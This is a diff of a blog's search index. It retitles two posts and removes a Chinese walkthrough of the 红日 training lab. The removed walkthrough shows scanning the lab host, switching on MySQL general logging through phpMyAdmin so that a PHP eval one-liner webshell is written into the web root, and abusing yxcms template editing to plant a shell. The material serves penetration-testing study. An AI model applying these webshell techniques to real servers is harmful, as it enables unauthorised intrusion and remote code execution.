@@ -4,7 +4,7 @@
   
   
   <entry>
-    <title></title>
+    <title>经典漏洞复现</title>
     <link href="/2023/12/05/%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
     <url>/2023/12/05/%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
     
@@ -17,20 +17,7 @@
   
   
   <entry>
-    <title></title>
-    <link href="/2023/11/15/%E7%BA%A2%E6%97%A5/"/>
-    <url>/2023/11/15/%E7%BA%A2%E6%97%A5/</url>
-    
-    <content type="html"><![CDATA[<h1 id="红日靶场一"><a href="#红日靶场一" class="headerlink" title="红日靶场一"></a>红日靶场一</h1><h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>对靶机192.168.10.32端口扫描发现只有80能用</p><p>直接访问80端口发现<img src="/image/%E7%BA%A2%E6%97%A5/1700058489411.png" alt="1700058489411">泄露了网站路径</p><p>对靶机192.168.10.32:80进行目录扫描发现phpmyadmin和yxcms目录还有一个</p><h3 id="phpmyadmin日志写shell"><a href="#phpmyadmin日志写shell" class="headerlink" title="phpmyadmin日志写shell"></a>phpmyadmin日志写shell</h3><ol><li><p>查看日志状态</p><p>在sql处运行语句 <code>show variables like &#39;%general%&#39;;</code></p></li></ol><p><img src="/image/%E7%BA%A2%E6%97%A5/1700056937162.png" alt="1700056937162"></p><p>general_log为off</p><p>2.打开日志</p><p>运行语句 <code>set global general_log=&quot;on&quot;</code></p><p>3.修改网站日志在网站根目录C:&#x2F;phpStudy&#x2F;WWW&#x2F;1.php</p><p>运行语句 <code>set global  general_log_file = &#39;C:/phpStudy1/WWW/1.php&#39;</code></p><p><img src="/image/%E7%BA%A2%E6%97%A5/1700059647378.png" alt="1700059647378"></p><p>4.写入一句话木马</p><p><code>select &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot;</code></p><p>5.蚁剑连接</p><p><img src="/image/%E7%BA%A2%E6%97%A5/1700059896299.png" alt="1700059896299"></p><h3 id="yxcms打点"><a href="#yxcms打点" class="headerlink" title="yxcms打点"></a>yxcms打点</h3><p>1.访问yxcms在公告信息处发现后台目录和账号密码</p><p><img src="/image/%E7%BA%A2%E6%97%A5/1700134561081.png" alt="1700134561081"></p><p>2.通过账号密码进入后台</p><p><img src="/image/%E7%BA%A2%E6%97%A5/1700134730605.png" alt="1700134730605"></p><p>3.后台sql执行处应该可以日志getshell</p><p><img src="/image/%E7%BA%A2%E6%97%A5/1700135651164.png" alt="1700135651164"></p><p>4.前台模板管理模板处写getshell</p><p><img src="/image/%E7%BA%A2%E6%97%A5/1700136073932.png" alt="1700136073932"></p><p>点编辑可以直接写webshell</p><p><img src="/image/%E7%BA%A2%E6%97%A5/1700136124745.png" alt="1700136124745"></p><p>但是不知道文件路径先对目录扫描一波扫描到备份文件，通过备份文件找到模板文件路径&#x2F;yxcms&#x2F;protected&#x2F;apps&#x2F;default&#x2F;view&#x2F;default&#x2F;xxx.php</p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><p>先使用ipconfig收集内网ip找到内网ip 192.168.52.143</p><p><img src="/image/%E7%BA%A2%E6%97%A5/1700137917950.png" alt="1700137917950"></p><p>用cs生成一个载荷</p>]]></content>
-    
-    
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>渗透测试课程作业1</title>
+    <title>渗透测试课程作业</title>
     <link href="/2023/11/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A1/"/>
     <url>/2023/11/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A1/</url>
     
